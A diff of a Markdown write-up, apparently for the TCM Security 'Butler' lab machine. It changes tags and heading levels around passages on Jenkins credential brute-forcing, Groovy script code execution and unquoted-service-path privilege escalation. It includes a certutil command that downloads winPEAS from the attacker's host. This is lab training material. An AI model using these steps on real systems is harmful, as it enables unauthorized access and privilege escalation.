@@ -3,7 +3,20 @@ title: 'Butler Machine (TCM Security) — Step-by-Step Walkthrough'
 bannerTitle: TCM Security Machine — Butler Walkthrough
 date: '2025-12-05'
 draft: false
-tags: ['windows', 'Machine', 'jenkins', 'privilege-escalation']
+tags:
+  [
+    'Windows',
+    'Machine',
+    'Easy',
+    'Jenkins',
+    'Weak Credentials',
+    'Groovy Script',
+    'Remote Code Execution',
+    'Unquoted Service Path',
+    'winPEAS',
+    'msfvenom',
+    'Privilege-Escalation',
+  ]
 summary: 'Compromise of a Windows machine via Jenkins default credentials and Groovy script RCE, followed by privilege escalation through an unquoted service path vulnerability in the WiseBootAssistant service.'
 images: ['/static/images/butler/preview.png']
 ---
@@ -93,7 +106,7 @@ Since Jenkins commonly runs with elevated privileges and supports script executi
 
 Based on this discovery, further enumeration was focused on **`Jenkins authentication mechanisms and configuration**.`
 
-### **Jenkins Authentication Bypass (Brute Force)**
+# **Jenkins Authentication Bypass (Brute Force)**
 
 ![butler](/static/images/butler/image%202.png)
 
@@ -106,7 +119,7 @@ During the attack, I identified valid credentials:
 
 This confirmed that Jenkins was exposed with **weak/default credentials**, granting me unauthorized access to the administrative interface.
 
-### **Post-Authentication Access**
+## **Post-Authentication Access**
 
 ![butler](/static/images/butler/image%203.png)
 
@@ -155,7 +168,7 @@ winPEASx64.exe                                  100%[===========================
 
 ```
 
-### **Privilege Escalation Enumeration with winPEAS.exe**
+## **Privilege Escalation Enumeration with winPEAS.exe**
 
 After establishing an initial foothold on the machine, the next objective was to identify potential privilege escalation vectors. Given that Butler is a Windows-based target, I opted to use **`winPEAS.exe`.**
 
@@ -187,8 +200,6 @@ certutil.exe -urlcache -f http://10.0.2.4/winPEASx64.exe winpeas.exe
 ****  Online  ****
 CertUtil: -URLCache command completed successfully.
 ```
-
-### **Privilege Escalation**
 
 During local enumeration with **`winPEAS`**, I identified a vulnerable Windows service named **`WiseBootAssistant`** (Wise Care 365). The service was running with elevated privileges and had an **`unquoted executable path containing spaces`**, making it susceptible to an unquoted service path attack.
 
@@ -237,7 +248,7 @@ c:\Program Files (x86)\Wise>
 
 ```
 
-### **Service Restart and Escalation**
+# **Service Restart and Escalation**
 
 I restarted the vulnerable service to trigger execution of the malicious binary:
 
